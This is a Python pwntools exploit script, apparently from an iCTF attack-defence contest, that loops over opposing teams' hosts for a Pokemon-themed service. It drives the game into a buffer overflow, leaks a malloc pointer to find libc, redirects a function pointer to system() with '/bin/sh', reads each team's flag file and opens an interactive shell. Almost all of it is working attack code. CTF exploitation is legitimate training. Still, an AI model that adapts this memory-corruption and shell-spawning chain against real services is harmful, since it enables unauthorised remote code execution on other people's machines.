from pwn import *
import ictf

s = process("../files/pokemon/ro/pokemon_bin")

i = ictf.iCTF()
t = i.login("XXXXXXXXXXXXX", "XXXXXXXXXXXXXXXX")

service = [s for s in t.get_service_list() if s['service_name'] == "pokemon"][0]

ss = ssh(host="35.165.220.138", port=1515,user="ctf", keyfile="../ssh_key")
flags = []

targets = t.get_targets(service['service_id'])['targets']
random.shuffle(targets)

i = 30
for target in targets:
        try:
                print target['team_name'], target['hostname'], target['port']

                if target['team_name'] in ["KLTM"]:
                        continue
                s = ss.connect_remote(target['hostname'], target['port'], timeout=1)
		flag_id = target['flag_id']

		s.sendline("")
		buf = flag_id
		s.sendline(buf)
		s.sendline("2")

		def get_rare():
			for i in xrange(2):
				s.sendline("w")
			s.sendline("grab")
			for i in xrange(2):
				s.sendline("s")
			for i in xrange(14):
				s.sendline("d")
			s.sendline("w")
			s.sendline("s")
			for i in xrange(14):
				s.sendline("a")
			s.clean(.1)

		for i in xrange(6):
			get_rare()

		print "Candies got"
		s.sendline("s")
		s.clean(.1)
		s.sendline("s")

		def check_wild():
			buf = s.clean(.1)
			if buf.count("Wild"):
				return buf

		def handle_wild(buf):
			print "Fighting"
			while buf.count("Choose"):
				s.sendline("1")
				s.sendline("1")
				buf = s.clean(.1)

		moves = ["s",'w']
		i = 0
		j = 0
		while 1:
			buf = check_wild()
			if buf:
				handle_wild(buf)
				j += 1
				if j == 5:
					break
				print "Fight won"
			s.sendline(moves[i%2])
			i += 1

		print "Farmed"
		if moves[i%2] == "s":
			buf = check_wild()
			if buf:
				handle_wild(buf)
			s.sendline("s")
			
		for i in xrange(5):
			buf = check_wild()
			if buf:
				handle_wild(buf)
			s.sendline("s")

		for i in xrange(3):
			s.sendline("d")
		s.clean(.1)

		s.sendline("talk")
		s.recvuntil("You have: ")
		coins = int(s.recvline()[:-2])
		#get tm01
		s.sendline("4")
		s.sendline('1')

		#buy pokeballs
		s.sendline("2")
		s.sendline("%d" % ((coins-100)/40))

		s.sendline("q")
		print "Bought"

		for i in xrange(8):
			s.sendline('d')

		moves = ['d','a']
		i = 0
		while 1:
			buf = check_wild()
			if buf:
				break
			s.sendline(moves[i%2])
			i += 1
			
		s.sendline("2")
		s.sendline("9")
		buf = s.clean(.1)
		while buf.count("Failed") and buf.count("9) Pok"):
			print "Throw"
			s.sendline("2")
			s.sendline("9")
			buf = s.clean(.1)
				
		s.sendline("y")
		s.sendline("A"*8+p64(0x6060e0)+"C"*8+p64(0x400FE9))
		s.sendline("items")

		#setup swap
		s.sendline("5")
		s.sendline("3")

		#tm 8
		s.sendline("8")
		#use on new guy
		s.sendline("1")
		#active new gu
		s.sendline("1")
		#move 0
		s.sendline("0")
		#swap
		s.clean(.1)
		s.sendline("y")
		s.recvuntil("0) ")

		buf = s.recvline().strip()

		ptr = u64(buf.ljust(8,"\x00"))
		print hex(ptr)
		s.sendline("q")
		s.sendline("q")

		#get the guy up first
		s.sendline("team")
		s.sendline("0")
		s.sendline("release")
		s.sendline("q")

		moves = ['d','a']
		i = 0
		while 1:
			buf = check_wild()
			if buf:
				break
			s.sendline(moves[i%2])
			i += 1

		s.sendline("1")
		s.sendline("0")

		libc = ELF("libc.so")
		libc.address = ptr-libc.symbols['malloc']

		s.sendline("/bin/sh;#\x60\x60\x00"+"\x00"*4+"C"*8+p64(libc.symbols['system']))

		s.sendline("1")
		s.sendline("0")
		s.clean(.1)
		s.sendline("cat %s" % (flag_id))

		print s.clean(.1)
		print flag_id
		s.interactive()
	except:
		break
